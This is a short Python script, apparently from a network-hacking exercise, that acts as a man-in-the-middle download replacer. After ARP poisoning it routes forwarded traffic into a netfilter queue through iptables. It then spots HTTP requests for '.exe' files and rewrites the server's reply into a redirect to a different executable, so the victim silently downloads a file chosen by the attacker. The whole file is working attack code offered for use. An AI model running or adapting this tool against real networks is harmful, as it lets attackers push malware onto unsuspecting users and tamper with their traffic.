#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def packet_interpreter(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar591ar.exe\n\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()


try:
    # For Real Arp Poisoned PC
    subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    # To Test Code on Local PC
    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, packet_interpreter)
    queue.run()
except KeyboardInterrupt:
    print('\nFlushing IP Tables')

    # To Disable IP Forwarding
    # subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    subprocess.call('iptables --flush', shell=True)
